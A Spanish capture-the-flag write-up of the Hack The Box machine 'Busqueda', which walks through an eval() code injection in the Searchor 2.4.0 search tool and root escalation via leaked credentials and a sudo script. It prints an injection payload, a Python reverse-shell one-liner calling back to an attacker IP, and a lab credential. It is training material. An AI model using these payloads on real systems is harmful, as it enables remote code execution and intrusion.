---
title: Write-up Busqueda [Easy] - Hack The Box
date: 2023-04-14
categories: [Writeups, Hack The Box]
tags: [writeup, hackthebox, machines, easy, pentesting]
image: /assets/img/hackthebox/machines/busqueda/busqueda.png
image_link: false
---

Publicación del write-up de sujeto a las [guías generales](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines) de Hack The Box.

# Write-up Busqueda \[Easy\] - Hack The Box
\\
**Mi perfil de Hack The Box: [julianglez16](https://app.hackthebox.com/users/1084561)**


# Enumeración


### Puertos


![Untitled.png](/assets/img/hackthebox/machines/busqueda/puertos.png)


### Directorios web


![Untitled.png](/assets/img/hackthebox/machines/busqueda/directorios-web.png)


### Virtual hosts


### Tecnologías web


![Untitled.png](/assets/img/hackthebox/machines/busqueda/tecnologias-web.png)


### Funcionalidad web


![Untitled.png](/assets/img/hackthebox/machines/busqueda/funcionalidad-web1.png)


![Untitled.png](/assets/img/hackthebox/machines/busqueda/funcionalidad-web2.png)


Al realizar una búsqueda cualquiera con el checkbox desmarcado se nos redirige a una web con una URL.


![Untitled.png](/assets/img/hackthebox/machines/busqueda/funcionalidad-web3.png)


### Análisis con BurpSuite


Al realizar una búsqueda se realiza una petición POST al servidor web


![Untitled.png](/assets/img/hackthebox/machines/busqueda/burpsuite.png)


# Explotación


### Usuario


La página web hace uso de una herramienta OpenSource llamada _Searchor_ en la versión 2.4.0. Al buscar esta herramienta en google se puede obtener su código fuente desde Github. En la versión 2.5.0 se cambia una funcionalidad relacionada con la generación de la URL que se obtiene al realizar una búsqueda, eliminando el uso de la función `eval()` de python para su generación.


Analizando el código fuente se puede observar una posible entrada a través de una inyección de comandos en el servidor gracias a la función `eval()` de python.


![Código vulnerable de la herramienta Searchor](/assets/img/hackthebox/machines/busqueda/expl-usuario1.png)


Para inyectar código se necesita que las líneas de código relacionadas con la función `eval()` de python sean modificadas. Para realizar esto, se utiliza el payload `‘),#` para obtener un código similar al siguiente:


![Untitled.png](/assets/img/hackthebox/machines/busqueda/expl-usuario2.png)


Una vez realizada la inyección se utiliza el payload `'),` **`import`**`('os').popen('ping -c10 127.0.0.1')#` para comprobar si existe un retardo de 10 segundos en la respuesta del servidor y comprobar así que existe una inyección de código.


En la respuesta del servidor se puede observar que sí que existe dicha inyección debido al restardo y a la respuesta HTML que se recibe.


![Untitled.png](/assets/img/hackthebox/machines/busqueda/expl-usuario3.png)

Conociendo esto, se utiliza la función `exec()` de python para generar un _shell_ reverso hacia nuestra máquina y obtener conexión con el usuario. El payload para el _shell_ reverso es el siguiente: `'), exec('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.72",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")')#`


![Untitled.png](/assets/img/hackthebox/machines/busqueda/expl-usuario4.png)


### Root


Una vez conectados a la máquina, en el directorio `/var/www/app/.git` se encuentra un fichero _config_ en el que se ven las credenciales de un usuario: `cody:jh1usoih2bkjaspwe92`


![Untitled.png](/assets/img/hackthebox/machines/busqueda/expl-root1.png)


Al hacer `sudo -l` con esas credenciales se obtienen los ficheros que se pueden ejecutar con sudo desde el usuario svc


![Untitled.png](/assets/img/hackthebox/machines/busqueda/expl-root2.png)


En el fichero _config_ donde se encontraron las credenciales también se puede ver un subdominio de la máquina al que se puede acceder: <u>http://gitea.searcher.htb</u>


![Untitled.png](/assets/img/hackthebox/machines/busqueda/expl-root3.png)


Al hacer login con las credenciales obtenidas del usuario se puede ver que existe un usuario `Administrator`


![Untitled.png](/assets/img/hackthebox/machines/busqueda/expl-root4.png)


De vuelta al fichero de python con permisos de ejecución con sudo desde el usuario svc se puede observar lo siguiente:


![Untitled.png](/assets/img/hackthebox/machines/busqueda/expl-root5.png)


![Contenedores activos en la máquina](/assets/img/hackthebox/machines/busqueda/expl-root6.png)


![Untitled.png](/assets/img/hackthebox/machines/busqueda/expl-root7.png)


![Untitled.png](/assets/img/hackthebox/machines/busqueda/expl-root8.png)


Al utilizar la funcionalidad _docker-inspect_ se puede obtener información de los contenedores activos en la máquina. Con la opción {% raw %} `‘{{json .}}’`{% endraw %} en el argumento `<format>` se obtienen contraseñas interesantes de la base de datos MySQL disponible en uno de los contenedores. 


![Untitled.png](/assets/img/hackthebox/machines/busqueda/expl-root9.png)


En este caso, la contraseña declarada en la variable de entorno `MYSQL_PASSWORD` del contenedor coincide con la contraseña del usuario `administrator` en el portal de _Gitea_. Esto nos da acceso al código fuente del script _`system-checkup.py`_, revelando que el comando ejecuta un script de bash llamado _`full-checkup.sh`_.


![Untitled.png](/assets/img/hackthebox/machines/busqueda/expl-root10.png)


Tras averiguar esto, solamente hay que crear un script de bash que nos de acceso como `root`


![Untitled.png](/assets/img/hackthebox/machines/busqueda/expl-root11.png)


![Untitled.png](/assets/img/hackthebox/machines/busqueda/expl-root12.png)

